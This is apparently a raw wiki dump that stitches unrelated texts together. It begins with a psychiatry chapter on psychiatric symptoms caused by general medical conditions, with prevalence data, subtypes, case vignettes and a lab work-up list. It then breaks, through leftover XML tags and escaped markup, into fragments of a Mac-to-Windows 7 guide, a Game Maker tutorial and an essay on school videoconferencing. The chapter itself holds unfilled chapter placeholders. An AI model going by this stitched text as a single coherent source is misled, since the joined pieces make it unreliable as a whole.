The community prevalence of psychiatric symptoms secondary to general medical conditions (Psy-GMCs) is not well-established, nor is it straightforward to determine. Data from a consultation-liaison service, however, provide some sense of how common Psy-GMCs may be in certain high-risk medical settings.  For example, Rundell and Wise (1989) reviewed  755 cases seen by the psychiatric C-L service in a general hospital.  Fully 38% of depressed patients had some underlying medical or neurological disorder as the likely cause of their depression. The most frequent diagnoses were cerebrovascular accident; Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease; lupus cerebritis, HIV infection, hypothyroidism, and multiple sclerosis. With respect to manic syndromes on this C-L service, the findings were even more striking: ''87% of manic patients ''had a diagnosis of &quot;organic mood disorder.&quot; The most commonly-implicated causes of this &quot;secondary mania&quot; were corticosteroids, human immunodeficiency virus (HIV) infection, and temporolimbic epilepsy. Psychiatric clinic populations may also show a high prevalence of GMCs associated with psychiatric symptoms. Thus, Koranyi (1979) found that in a psychiatric clinic population, 18% had psychiatric symptoms that could be attributed solely to an underlying—and undetected—medical problem. On the other hand, in routine, non- general hospital, psychiatric inpatient settings, some types of Psy-GMCs may be quite rare. For example, Lo et al (2007) found that the prevalence of &quot;organic delusional disorder&quot; according to DSM-III-R criteria was only 0.4% of total inpatient psychiatric admissions.

&lt;u&gt;'''''General features and phenomenology of Psy-GMCs'''''&lt;/u&gt;

There are no pathognomonic signs that reliably distinguish  psychiatric disturbances due to general medical  (&quot;organic&quot;) conditions (Psy-GMCs) from those due to primary psychiatric disorders. For example, with respect to ''manifestations of the'' ''depression itself'', there are no singular objective features that would unequivocally distinguish, say, depression due to ''folic acid deficiency'' from depression seen in a typical ''major depressive episode''. However, careful attention to (1) the onset, history, and course of the present illness; (2) the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s age, prior medical and psychiatric illnesses, and family history; as well as (3) accompanying physical and laboratory findings, may all be of help.

For example, depressive, manic, anxious, or psychotic symptoms that appear to &quot;track with&quot; (correspond closely in time and intensity) the course of an underlying medical disorder may prove to be secondary to that disorder (see Case Vignette). Similarly, the onset of psychiatric symptoms following the introduction, discontinuation, or change in dosage of a particular drug should always raise the prospect of a &quot;secondary&quot; psychiatric syndrome.

The ''mental status exam'' may provide clues as to the &quot;secondary&quot; nature of the psychiatric disturbance; e.g., unusual cognitive deficits (such as severe memory impairment) in a patient presenting with anxiety (Goldman, 1992). Abnormal findings on ''physical examination'' (such as hypo- or hyperactive reflexes, signs of vitamin deficiency, etc.) and ''laboratory testing'' (such as anemia, decreased thyroid function, etc.) may also be helpful in discerning an underlying GMC.

On the other hand, correction of an underlying physical abnormality or drug toxicity does not always translate into an ''immediate'' remission of secondary psychiatric symptoms; often, there is a &quot;lag&quot; between correction of the underlying medical or drug-related problem and return to euthymia or baseline mental state. Indeed, as Colon and Popkin observe, sometimes—despite correction of the underlying medical problem—the secondary psychiatric symptoms may develop &quot;a life of their own&quot; and persist for long periods (Colon &amp; Popkin, 2006). Furthermore, as O&lt;nowiki&gt;’&lt;/nowiki&gt;Brien et al (2006) note,

&quot;In some cases (eg, adrenal insufficiency), appropriate and continued treatment of the underlying condition results in resolution of the psychiatric symptoms. In others (eg, SLE), treatment of the underlying condition may alleviate but may also exacerbate psychiatric symptoms.&quot;

''Advanced age, or older age of onset of psychiatric illness '' is sometimes a clue to an underlying GMC, though by no means an infallible one. Since the elderly (as well as the very young) are at greater risk for medical illnesses generally, the sudden appearance of apparent psychiatric symptoms in someone over the age of 55 ought to trigger a search for underlying medical factors (though one could say the same for a younger patient with a similarly abrupt onset of psychiatric illness). One&lt;nowiki&gt;’&lt;/nowiki&gt;s level of suspicion is generally highest in an ''older'' patient whose ''family history'' is &quot;negative&quot; for psychiatric disorders, and whose symptoms appear ''temporally linked to a GMC or drug-related event''. In this regard, Lo et al (2007) reported that compared to patients with (functional) Delusional Disorder, those with &quot;Organic Delusional Disorder&quot; usually had an older age of onset, and less frequently had a relevant family psychiatric history. Similarly, patients diagnosed with &quot;organic mood disorder&quot; were more likely to have a negative family history of depression, compared to medically-ill patients with a diagnosis of major depression (Yates et al, 1991). The patients with organic mood disorder were also less likely than their counterparts to have recovered fully after four years, despite similar treatment as those with major depression. As noted above, patients with older age at onset of affective illness, and without family history of depression, are more likely to have evidence of vascular CNS abnormalities on MRI than those with earlier onset illness.

With respect to temporal patterns, an important caveat is in order here: as Colon and Popkin (1996) judiciously observe:

&quot;Many clinicians are inclined to rely heavily on a temporal relation to establish an organic etiological relation. Although temporal relation is an instructive parameter, it may be misleading and subject to errors of recall. It is also apparent that psychiatric symptoms may antedate the clinical recognition of the physical illness—that is, anxiety and depression may be the first presenting features of a medical illness.&quot; (p. 413)

Sometimes, the &quot;phenomenology&quot; of the syndrome may provide a clue as to its etiology, though this is far from universally the case. For example, when ''psychotic symptoms'' develop in the context of a GMC, they tend to present in a characteristic pattern. Thus, many secondary psychotic syndromes are characterized by paranoid delusions, persecutory thoughts, and ideas of reference. Delusions tend to be ''concrete and changeable'', in contrast to the often elaborate, bizarre, and relatively stable delusions seen in, say, schizophrenia or mania. Lishman characterizes &quot;organic delusions&quot; as often ''persecutory'' in content, but typically &quot;…poorly elaborated, vague, transient, and inconsistent…&quot; (Lishman, 1998, p. 11). So, for example, the elderly patient in a nursing home who develops an &quot;organic psychosis&quot; may say, on Monday, &quot;The nurses are trying to poison me.&quot; On Tuesday, the same patient may have no particular fears regarding the nurses, but may complain, &quot;My roommate is stealing my jewelry.&quot;  However, in organic delusional syndromes ''without clouding of consciousness'', Lishman notes that &quot;…the delusions may be more coherently organized, with a picture more closely resembling schizophrenia.&quot;

With respect to GMCs associated with anxiety, Colon and Popkin (1996) note that, &quot;…there are few current data to indicate whether panic emerging in the medical patient differs from that seen in the primary psychiatric setting. In addition, no data are available about factors such as course and onset in the medical setting.&quot; One exception is the finding by Starkman et al (1985) showing that in patients (N=17) with pheochromocytoma—a GMC long-associated with anxiety-- none described the severe apprehension or fear characteristic of panic attacks, and ''none described agoraphobia.''

Depression in the medical setting is comprehensively reviewed by Rouchell et al (1996). Again, there are no pathognomonic signs that clearly point to &quot;secondary&quot; or &quot;organic&quot; depressive symptoms. In addition, the standard diagnostic criteria for major depression in DSM-IV have not been normed for individuals with co-morbid medical illness. However, Goldman (1992) offers the following clues suggesting an underlying medical cause: ''an atypical clinical picture; resistance to standard treatments; unexplained personality changes; and subtle cognitive findings on mental status exam''.

The course of Psy-GMCs depends to a large degree on the nature of the underlying medical condition and how responsive it is to primary treatment. The course is also influenced by the extent and success of symptomatic psychiatric treatment. For example, when there is a progressive or intermittently active degenerative CNS process at work, such as multiple sclerosis, course and outcome are likely to be less favorable. On the other hand, psychiatric symptoms due to acute anticholinergic toxicity may be resolved within a matter of hours, if diagnosis and treatment proceed expeditiously.

&lt;u&gt;'''''Psychotic Disorder Due to GMC'''''&lt;/u&gt;

Psychotic symptoms may result from a multitude of medical and neurological disorders, as well as from numerous drug-related side effects. Some of the more common organic etiologies are shown in Table 2.

In the DSM-IV, ''Psychotic Disorder Due to GMC'' is sub-typed based on the predominant symptom; i.e., &quot;with delusions&quot; or &quot;with hallucinations&quot;. Of course, the two often occur together. The DSM-IV also specifies that the symptoms must not occur exclusively while the patient is ''delirious'', or be better explained by another mental disorder.

Although a plethora of medical and neurological conditions may produce psychotic symptoms, particular attention should be focused on disorders affecting the ''occipital'' and ''temporal'' regions. For example, cerebral tumors in these regions may produce hallucinations in various modalities, as well as delusions (Sadock &amp; Sadock, 2007). The differential diagnosis of &quot;psychosis&quot; is therefore extremely important. In one study (Malmud, 1967) 6 of 11 patients with temporal lobe tumors initially presented with a diagnosis of ''schizophrenia, ''though other studies of patients with temporal lobe tumors have shown much lower rates of psychotic symptoms . ''Complex partial seizures'' originating in the temporal or frontal regions may also  produce psychotic-like symptoms, as well as olfactory or gustatory hallucinations. ''Substance-induced psychotic disorders'' are discussed in Chapter (    ).

''Case vignette: Ms. A, a 38-year-old white female with long history of vague medical problems, was brought to emergency room by her family because she had boarded up all the windows at her house and refused to come outside. The patient claimed her neighbors were &quot;spying&quot; on her and &quot;want to do me in.&quot; She was fully oriented, and both recent and remote memory intact. There was no fluctuation in her level of consciousness. The patient denied any unusual perceptual changes, auditory, visual, or tactile hallucinations. Physical examination was essentially normal. However, laboratory studies revealed normocytic anemia, leukopenia, and red cell casts in urine. Subsequent testing for antinuclear antibody (ANA) was strongly positive; a provisional diagnosis of systemic lupus erythematosus (SLE) with cerebral involvement (&quot;lupus cerebritis&quot;) was made.''

&lt;u&gt;'''''Mood disorder due to general medical condition'''''&lt;/u&gt;

The DSM-IV recognizes four main subtypes of mood disorder due to a GMC: ''with depressive features; with major-depressive like episode; with manic features; ''and'' with mixed features. ''The ICD-10 uses a slightly different scheme, differentiating ''organic manic disorder; organic bipolar disorder; organic depressive disorder; ''and'' organic mixed affective disorder.''

As with the psychoses due to GMCs, secondary mood disorders may stem from a multitude of underlying medical and neurological conditions. In consultation-liason settings, as noted earlier, the most frequent underlying GMCs were cerebrovascular accident (including stroke); Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease; lupus cerebritis, HIV infection, hypothyroidism, and multiple sclerosis (Rundell &amp; Wise, 1989). Post-stroke depression merits special attention, in that as many as 50% of all post-stroke patients experience depressive illness. A similar percentage applies to patients with pancreatic cancer, and to about 40% of patients with Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (Sadock &amp; Sadock, 2007). However, the diagnosis of depression in the medical setting is complicated by the substantial overlap between ''somatic symptoms'' related to the underlying GMC, and ''neurovegetative symptoms'' of depression (for review, see Harnett, 2001). For example, some data (Musselman et al, 1998) indicate that major depression is seen in approximately 15-20% of patients with coronary (ischemic) heart disease (IHD). However, depression may sometimes be over-diagnosed in this population if &quot;lethargy&quot; or &quot;apathy&quot; ''secondary to congestive heart failure'' is inappropriately counted as signifying major depression. There may also be over-diagnosis of depression in IHD patients who have become &quot;demoralized&quot;—but not clinically depressed—about their medical setbacks (Harnett, 2001).

Indeed, the pathophysiological relationship between underlying medical illness and mood disorder is quite complex. For example, it is not always clear to what degree a depressed medical patient may be &quot;reacting psychologically&quot; to the incapacity stemming from a GMC; or experiencing subtle but direct ''biochemical and immunological effects on the brain'', stemming from the GMC (Harnett &amp; Pies, in press). One illustration of this is in the area of IHD. Depression-related immune dysfunction may worsen IHD via inflammatory cytokines (e.g., interleukin-6, tumor necrosis factor alpha). But IHD-related immune abnormalities may also contribute to depression (Kop et al, 2005). Moreover, social isolation, psychosocial stress, and low levels of perceived support are related to ''both ''depression ''and'' IHD, and could mediate bidirectional effects on these conditions (Barth et al, 2004; Lett et al, 2004). However depression is a well-established risk factor for increased mortality in post-myocardial infarction patients. In short, there are very complex relationships between underlying medical illness and the appearance of depressive symptoms.

This is also true, to some degree, with ''medication-related'' mood alterations. Establishing a causal connection between ingestion of a particular drug and the development of clinical depression is far from straightforward, notwithstanding epidemiological evidence linking some drugs with depression (Rogers and Pies, 2008). Although often mentioned as causes of drug-induced depression, ''beta blockers'' and ''calcium channel blockers'' are only weakly-linked with this side effect. In contrast, some medications—such as ''alpha-interferon'' and ''isotretinoin''—do appear strongly, if not causally, linked with new- onset depression (Bonaccorso et al, 2002; Wysowski et al, 2001)

''Case vignette'': ''Mr. A., a 65-year-old married male without prior psychiatric history presented with a one month history of &quot;feeling really down.&quot; He also related that, for the past three weeks or so, he had experienced vague gastrointestinal distress; decreased appetite; and a 15-lb weight loss. One month earlier, a close friend had died after a long illness, and Mr. A. attributed his sadness to this recent loss. Mental status exam was notable for a pale, cachectic individual whose affect appeared somewhat blunted, with occasional tearfulness. Cognitive examination was essentially within normal limits. Physical examination revealed an enlarged, non-tender gallbladder, and slight jaundice. Urinary amylase levels were elevated. A CT scan of the abdomen revealed cancer of the head of the pancreas with obstruction of the gallbladder.''

&lt;u&gt;'''''Anxiety disorder due to general medical condition'''''&lt;/u&gt;

'' ''

The DSM-IV defines three main subtypes of anxiety disorder due to GMC: with ''generalized anxiety'', with ''panic attacks'', and with ''obsessive-compulsive'' symptoms. Although the overall prevalence of anxiety due to GMCs is not known, there is substantial evidence that medically-ill individuals have higher rates of anxiety than does the general public (Sadock &amp; Sadock, 2007). For example, one study of patients with Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s disease found that 38% of patients received a current DSM-III-R anxiety disorder diagnosis, including panic disorder, generalized anxiety disorder, and social phobia (Stein et al, 1990). Importantly, severity of anxiety was not correlated with severity of parkinsonian symptoms, cumulative duration of L-dopa exposure, or current dose of L-dopa. Similarly, among diabetic patients, the lifetime prevalence rates for phobic disorders and generalized anxiety disorders were 26.5% and 41%, respectively (Lustman et al, 1986).

As with other categories of secondary psychiatric symptoms, anxiety due to GMCs may stem from many underlying causes, as shown in Table 3.  ''Endocrinopathies''—notably, hyperthyroidism, hypo- and hyperparathyroidism, and pheochromocytoma—are commonly associated with anxiety (as well as with depression). ''Cardiac arrythmias'' may be both the cause, and the result, of anxiety, sometimes leading to a &quot;vicious cycle&quot;. For example, an individual with underlying heart disease who develops a &quot;run&quot; of supraventricular tachycardia may become very anxious upon experiencing the sensation of &quot;palpitations&quot;, and thereby exacerbate or prolong the tachycardia. Although ''mitral valve prolapse'' is mentioned in older textbooks as a cause of anxiety (especially panic attacks), the evidence for this link is actually tenuous. One recent review (Filho et al, 2008) concluded that, &quot;the more elaborate the study methodology, the lower the chance to observe a significant relationship between these (two) conditions.&quot;

A number of degenerative brain diseases may be associated with marked anxiety, including Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (DAT), Wilson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, and Huntington&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease. The frequency of anxiety in patients with DAT averages 48%, versus about 6% in elderly patients without DAT (Mega et al, 1996; Apostolova &amp; Cummings, 2008).

The list of ''medications'' causing anxiety is very extensive, and includes bronchodilators, thyroid preparations, theophylline, psychostimulants (such as methylphenidate), antipsychotics, and antidepressants. A variety of over-the-counter remedies, such as antihistamines and herbal preparations, may also trigger or exacerbate anxiety. Recently, anxiety, tachycardia, and even seizures have been linked with various &quot;energy drinks&quot; containing high concentrations of caffeine (Clauson et al, 2008).

'' Case vignette:  A 67 year-old. bedridden female was brought to the emergency room by her son. The patient had been experiencing severe anxiety for the past two hours. She was alert and oriented, but appeared extremely anxious and tremulous.  Her breathing was rapid and patient complained of palpitations and lightheadedness.  She had learned the day before that she was facing eviction from her apartment. The provisional diagnosis was &quot;Panic attack with hyperventilation, precipitated by threat of eviction.&quot;  Physical exam was notable for a pulse of 120; diaphoresis; and localized wheezes upon auscultation of the chest. A chest radiograph was within normal limits. However, a perfusion scintiscan of the lung revealed acute pulmonary embolus, and the patient was immediately hospitalized.''

&lt;u&gt;'''''Personality change due to general medical condition'''''&lt;/u&gt;

DSM-IV recognizes five main subtypes of personality change due to general medical condition (PC-GMC); i.e., ''labile, disinhibited, aggressive, apathetic'', and'' paranoid.'' However, &quot;other&quot; &quot;combined&quot; and &quot;unspecified&quot; subtypes allow for the almost infinite variations and combinations of personality alterations that may be observed clinically. The older term &quot;organic personality syndrome&quot; also subsumes these categories.

A variety of medical and neurological conditions may lead to alterations in the individual&lt;nowiki&gt;’&lt;/nowiki&gt;s usual personality, temperament, or life-long character traits. According to Reid (1989), the most common causes of PC-GMC (&quot;organic personality syndrome&quot;) are ''head trauma, cerebrovascular accident, ''and'' space-occupying intracranial lesions''. Other common causes include temporal lobe epilepsy, multiple sclerosis, chronic intoxications, endocrine disorders, and CNS infections such as neurosyphilis.

It is useful to focus on personality alterations due to lesions or dysfunction in ''frontal-subcortical circuits'' and within the ''temporal lobes.''  Tekin &amp; Cummings (2002) have identified five parallel frontal-subcortical circuits that link specific areas of the ''frontal cortex'' to the striatum, basal ganglia and thalamus. Lesions originating in the ''orbitofrontal'' region lead to personality changes characterized by ''disinhibition''; e.g., the patient begins to use profanity or exhibit sexually provocative behaviors. Lesions originating in the ''anterior cingulate ''portion of the frontal cortex produce an ''apathetic'' picture; e.g., a once outgoing and vociferous individual becomes withdrawn, indifferent, and uninterested in his usual activities.

Lesions or abnormal electrical activity in the temporal lobes also produce alterations in personality. For example, in temporal lobe epilepsy, the most common psychiatric abnormality is personality change (Chuang, 2006). Hyperreligiosity, hypergraphia, and hyposexuality are reportedly more common in patients with temporal lobe epilepsy than with other forms of epilepsy (Chuang, 2006), though not all neurologists accept this view. Tumors within or impinging upon the temporal lobes may also produce alterations in personality, including irritability, hypochondriasis, or an accentuation of neurotic traits. Some of these alterations may actually reflect temporal lobe epilepsy secondary to the tumor (Lishman, 1998).

''Case vignette: A 63 year-old banker was fired for inappropriate sexual advances toward employee. He was subsequently picked up by the police for urinating in parking lot of exclusive restaurant and shouting obscenities. His wife described him as &quot;just not himself over the past couple of months—it&lt;nowiki&gt;’&lt;/nowiki&gt;s like he has no self-control and no conscience.&quot; Neurological exam in the psychiatrist&lt;nowiki&gt;’&lt;/nowiki&gt;s office was essentially within normal limits, with no &quot;focal&quot; findings, except for abnormal grasp reflex (a tongue depressor repeatedly placed in the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s hand led to his repeatedly grasping it). Magnetic resonance imagery (MRI) showed a large meningioma of the orbitofrontal cortex''.

&lt;u&gt;'''''Catatonic Disorder Due to General Medical Condition'''''&lt;/u&gt;

&quot;Catatonia&quot; is probably best conceptualized as a syndrome with markedly diverse etiologies. Fink and Taylor (2006) have proposed three catatonia subtypes (''nonmalignant'', ''delirious'', and ''malignant'') and four specifiers (secondary to: mood disorders, general medical conditions or toxic states, neurological disorders, or psychotic disorders).

When no identifiable medical or neurological cause is present, about 40% of cases prove secondary to mood disorders, whereas only about 10% are associated with schizophrenia (Sadock &amp; Sadock, 2007). Catatonic disorder due to GMC is not a well-studied phenomenon, and its prevalence has not been clearly established. Features include ''immobility, psychomotor agitation, mutism, negativism, grimacing, peculiar motor behaviors (such as assuming and maintaining unusual postures, sometimes characterized by &quot;waxy flexibility&quot;), echolalia, ''and ''echopraxia.'' Medical and neurological causes of catatonia include drug toxicity, including neuroleptic malignant syndrome (NMS), CNS neoplasms, encephalitis, head trauma, lesions of the fronto-subcortical circuit, and contralateral parietal lobe lesions (Ovsiew, 2008). When catatonia is accompanied by fever and autonomic instability, it may represent ''malignant catatonia'', a potentially lethal form of catatonia which needs emergent treatment with electroconvulsive therapy (ECT) (Fink &amp; Taylor, 2006).

''Case vignette: A 53-year old male presented to a psychiatrist with a provisional diagnosis of &quot;late onset schizophrenia.&quot; The man had in fact been functioning quite well until about a year ago, when he developed insidious signs of forgetfulness, apathy, and abulia (loss of spontaneity and effort). Recently, he had also developed leg weakness and &quot;fainting spells.&quot; However, his presentation to the psychiatrist was one of mutism and marked decrease in voluntary movements of any kind; indeed, the psychiatrist described the patient as &quot;grossly catatonic.&quot; Given the atypical age of onset for schizophrenia, and history of leg weakness, an MRI was ordered. It revealed &quot;ventriculomegaly; hydrocephalus secondary to subthalamic mesencephalic tumor involving the third and the lateral ventricles.&quot; Surgical placement of a ventriculoperitoneal shunt led to resolution of the catatonia over a period of several days (Neuman et al, 1996).''

&lt;u&gt;'''''Amnestic Disorder due to GMC'''''&lt;/u&gt;

''Amnestic disorders'' entail impairment in the ability to learn new information, or to recall previously learned information''. ''Amnesia is most commonly found in patients with a history of ''alcohol abuse'' or ''head injury'', in which bilateral damage to mid-temporal lobe structures (such as the hippocampus, mamillary bodies or amgydala) has occurred. In the DSM-IV, the two primary categories are ''amnestic disorder due to GMC'', and ''substance-induced persisting amnestic disorder''. The latter will be discussed in chapter (   ), in relation to alcohol and benzodiazepine use.

Numerous GMCs may produce amnestic disorder, including ''thiamine deficiency, hypoglycemia, carbon monoxide poisoning, hypoxia, ''and'' herpes simplex encephalitis'', all of which tend to produce bilateral hippocampal damage (Sadock &amp; Sadock, 2007).  Korsakoff&lt;nowiki&gt;’&lt;/nowiki&gt;s Syndrome (KS) is characterized by marked amnestic symptoms in the presence of generally preserved cognitive function in other spheres. Essentially, KS is the chronic amnestic phase of ''Wernicke-Korsakoff Syndrome,'' which is discussed in chapter (   ). Though the predominant defect in KS is usually ''anterograde'' amnesia—i.e., impaired ability to retain new memories--there is often a ''retrograde'' amnestic component as well. Usually, there is relative sparing of remote memory. Lishman (1998) has noted that the line between Korsakoff&lt;nowiki&gt;’&lt;/nowiki&gt;s Syndrome and so-called ''alcoholic dementia'' is not always sharp, and there are most likely gradations or intermediate states between these two conditions.  KS–though conventionally attributed to thiamine deficiency—is closely associated with ''alcohol abuse and dependence''. Indeed, Lishman (1998) goes so far as to opine that, &quot;…the rarity of a fully fledged Korsakoff syndrome as a residue of thiamine deficiency in non-alcoholics raises the possibility that a direct neurotoxic action of alcohol may play some part in the evolution of the condition (p. 582).

&lt;u&gt;'''''Medical and Laboratory Evaluation for Psy-GMC'''''&lt;/u&gt;

{|border=&quot;0&quot; cellspacing=&quot;2&quot; width=&quot;100%&quot;
|colspan = &quot;3&quot;|Given the prevalence of undetected medical illness in psychiatric populations, it is incumbent upon the physician to treat all putative &quot;psychiatric&quot; symptoms with a certain degree of skepticism. 
|As noted earlier in this chapter, one&lt;nowiki&gt;’&lt;/nowiki&gt;s degree of suspicion is raised when the patient presents with a recent change in mental status, particularly when this occurs in temporal proximity to a known medical illness or drug-related event. Atypical presentations; late-life onset; and illness that fails to respond to standard therapies should all raise ones suspicion of a medical cause. The basic &quot;work up&quot; of suspected psychiatric symptoms due to GMC is outlined in Table 4.

'''Table 4'''

'''Laboratory and Physical Evaluation for Psy-GMC'''

* Vital signs
* Assess for pain complaints
* Gross physical exam immediately; complete physical ASAP with close attention to neurologic exam and detailed mental status examination
* Complete blood count, electrolytes, blood urea nitrogen, creatinine, glucose, VDRL (screening for syphilis), liver function tests, thyroid function tests, serum calcium, magnesium, phosphate, ammonia, erythrocyte sedimentation rate, HIV testing (where risk factors are present)
* Electrocardiogram (chest radiograph in selected cases)
* O2 saturation
* Urinalysis/drug screen
* EEG (helpful in confirming, monitoring delirium)

&lt;u&gt;'''''Treatment of Psy-GMCs'''''&lt;/u&gt;

''Treatment'' of individual Psy-GMCs is beyond the scope of this chapter, since it necessarily focuses on primary treatment of the numerous underlying medical conditions. Symptomatic treatment with psychotropic agents may be conservative for Psy-GMCs, and depends on whether the predominant disturbance is in the realm of mood, reality testing (psychosis), anxiety, personality, etc. Though psychotropics aimed at a particular GMC-related symptom may sometimes be useful—e.g., antipsychotics for &quot;organic&quot; psychosis, or antidepressants for depression due to a GMC—most psychotropics run the risk of further clouding the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s mental state, or introducing side effects and drug-drug interactions. Nevertheless, there is a role for judicious use of psychotropics in certain instances; e.g., antidepressants in post-stroke depression, or depression related to Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s disease.

      <text xml:space="preserve">This is intended to be a guide to those switching from OS X to Windows 7.  I'm assuming the Mac User is using OS X 10.5, and I'm using Windows 7 since that is the newest version of Windows made available.  There are plenty of guides to switching to Mac, but almost none for Mac to Windows.  This is meant to be helpful, not a book to air grievances on one side or the other.&lt;small&gt;—The preceding unsigned comment was added by [[User:JJohnson|JJohnson]] ([[User talk:JJohnson|talk]] • [[Special:Contributions/JJohnson|contribs]]) 02:16, 25 March 2009  (UTC)&lt;/small&gt;&lt;!-- Template:Unsigned2 --&gt;

      <text xml:space="preserve">This book is intended to serve as a guide for those who are switching to Windows for the first time, and making the move from OS X to Windows 7.  For this book, we will assume you are already using OS X 10.5.  We will highlight the differences between the two operating systems, and provide helpful comparisons in how to get things done in Windows 7.

Please enjoy this guide, and enjoy your new operating system!

      <text xml:space="preserve">==Similarities==
You will first see that the desktop in Windows 7 is very clean, with no menu bar at the top, but a single Taskbar at the bottom.  This is the most used interface construct, enabling access to the entire file system and to all running programs on the system.



==What's Different==

==The Taskbar==
[[File:Win7_taskbar.jpg|left]]
Running programs are contained in the Taskbar, indicated by a glass outline around the icon, intended to bring 'at-a-glance' indication of which programs are running.  If there are multiple windows of the program running, you will see a doubled outline around the icon.

[[File:Win7_taskbar2.jpg|left]]
When you hover your mouse over an open program, you will see a color highlight over the icon.  If you rest your mouse there, live thumbnails of each window will fade into view to show you which documents or browser tabs are open.

      <text xml:space="preserve">In Game Maker, almost everything you see on the screen are called objects.  

== Creating a sprite ==

Before you can create an object, whether it is a wall or another moving object, you need to create a sprite to display the object.  A single frame sprite is created by clicking the ''Create a sprite'' icon.  Within the new dialogue, click &quot;Load Sprite&quot; and select the bitmap file you want.  The sprite in question will appear to the right as a single grame.

=== Creating an animated sprite ===

To create an animated sprite, you need to select &quot;Edit Sprite&quot;. You can either create images manually, or import them from as an animation strip from the File menu. 

== Sprite options ==

In the sprite properties window, you have a few options:
* Precise collision checking
* Smooth edges
* Preload texture - causes the sprite to be loaded on startup rather than as-needed.
* Origin - the point of origin on the sprite 
* Bounding box - indicates the collision box on objects using the current sprite.


== Creating an object ==

Once the sprite is ready, you can proceed to create the object. 

== Object properties ==

On the left column, you can set the properties of the object:
* The sprite
* Visible and solid flags
* Depth (rendering order)
* Parent object (inherits properties from the patent)
* Mask (used for collision purposes)

== Events ==
In Game Maker, the various objects react to events. An event handler is created by clicking Add Event.

To react to a given event, create or select an event, and use the icons in the fourth column to choose the actions.  The entire palette of actions can be browsed by using the set of tabs on the far right. 

== Creating objects via scripts ==

Eventually, you will need to create objects dynamically through the script. This is performed by something similar to the following code:
&lt;code&gt;
id = instance_create(x,y,obj);
&lt;/code&gt;

The return value is the instance id of the newly created object.

= Using Videoconferencing in K-12 Schools=
By S. Richardson

== Introduction [http://www.slideshare.net/mbogart/videoconferencing-opportunities-in-k12]==

This is an exciting time in the history of K-12 Schools, with new learning technology emerging from every corner there is one that is entering the classroom at a rapid pace now which is video conferencing.   Is it hard to imagine that students can travel to Japan school or a museum an engage with other students and a specialist in real-time discussion without leaving their classroom is a wonder thing? Is it?   As educators today we must be committed to equip students today with skills and knowledge they will need to compete in the workforce and to prepare them for college. Student learning can be influenced in fundamental ways depending on the context in which it takes place and how it is translated.   With video conferencing students will have access to wide range experiences and different ways of learning different topics.    (Bransford,   Brown &amp; Cocking, 2000) stated that a “community-centered approach requires the development of norms for the classroom and school, as well as connections to the outside world, that support core learning values”.   The use of video conferencing can have strong effects on students learning and achievement.  Students are able to collaborate with other students regionally, statewide, nationally and globally to foster understanding to different cultures and active learning.  Teachers can use the technology as well to prompt professional development.  The fact of the matter is now many schools can not afford to pay full-time teachers in rural schools.  So, what is the next best thing schools are looking for you guessed it video conferencing as one of the forms for distance learning and a way to compete in the 21st century.


&lt;br/&gt; *Teacher Tude: '''Video conference in the classroom-Observation''' [http://www.teachertube.com/view_video.php?viewkey=d67f4d768abd29b985b2]

Here is a news video on the [[Alabama]][http://www.foxnews.com/video-search/m/21787909/online_high.htm#q=alabama]school system and how they are starting to use video conferencing in schools to teach courses within classes.  What are big step for Alabama high school system and this initiative by the state hopefully will be welcome by all schools within the state.

==What is Video Conferencing?[http://en.wikipedia.org/wiki/Video_conferencing]==

Video conferencing is a live transmission feed using video and audio between two or more terminals for communication needs.  Within any setting such as schools, the technology can be used in two different ways.  Schools are able to do a one-way transmission or two-way transmission.  The one-way (asynchronous) allow students to see and hear the teachers, but the teachers can not see the students.  The two-way video in real-time (synchronous) allow students and teachers to see and hear each other simultaneously.   Video conferencing will allow you to collaborate like never before over the network face-to-face communication with other schools and different locations of learning.
Using video conference equipment is pretty easy once the equipment is setup and hooked up to the network.  Here is a small check off list before having the video conference:

:# Make sure to schedule the meeting in advance and no IT support is required.
:# Keep in mind that launching the conference is as simple as making a conference phone call.
:# Make sure that in-room controls are intuitive.
:# Make sure collaboration applications are plugged in and working.
:# If you plan to use any power point or video clip, make sure to test the feed before the video conference.
:# Find out who will be connecting to whom.
:# Provide your IP address or ISDN line to the connecting and make sure to get the same information from the other party.
:# Make sure to have all contact information of the other party just in case you are having problems connecting.
:# Do a test call before the meeting at least two to three days in advance that will give you enough time to fix any problems that may occur during the test.


Video conferencing is also known as (IVC) interactive videoconferencing. IVC is now becoming more available to educators.   Video conferencing is still a developing area for K-12 education-schools have many systems to choose from and the cost of these systems has come down as well.  The capabilities of the video conference system have increase very much over the 50 years since the technology was development.  If educators are looking for more information about video conferencing, there is a book coming out on May 2009, by Camille Cole, Kecia Ray &amp; Jan Zanetis (2009) called “Videoconferencing for K-12 Classrooms, Second Edition” for educators, district administrators, technology coordinators, and others.

== What type of Network is needed? ==

Video conference can be transmitted in two different ways over IP (Internet Protocol) and ISDN (integrated services digital network) utilizing H.323 standards. A good speed to connect and start the videoconference unit is 384 or higher. The cheapest route for schools would be the IP.   Even though the ISDN service gives the schools a dedicated link it can also be very costly to schools some units require you to have six ISDN lines for their systems.  Most schools already have internet network so no additional installation maybe needed and they can build upon the strength of the existing infrastructure and if the infrastructure is up to par no special connections are needed.  The quality of the videoconference when using IP will depend on the internet traffic at the time of use. 

In an article by [[Jennifer Horton (2008)]][http://www.howstuffworks.com/framed.htm?parent=classroom-video-conferencing.htm&amp;url=http://www.ivci.com/buyers-guide-to-video-conferencing.html], she talks about 3 types of systems that schools are using to do their video conferencing which will give you a better idea of what to expect in different schools.  The integrated systems are portable units and desktop setups.   According to Horton, (2008) 

::Integrated systems are the most advanced setups and are generally used for more formal communication.  The video conferencing equipment is incorporated into the classroom’s design and usually consists of several monitors for displaying video, multiple microphones to capture sound and top-of-the –line codec to deliver optimal quality.  Portable units are less expensive than the integrated systems.  These portable setups typically consist of the monitor; microphone, camera and other equipment loaded onto a rolling cart that can be transported to whichever classroom need it.  Desktop setups are the cheapest method of video conferencing.  This setup includes a PC, a small camera mounted on top, a microphone and software to perform the job of the codec.

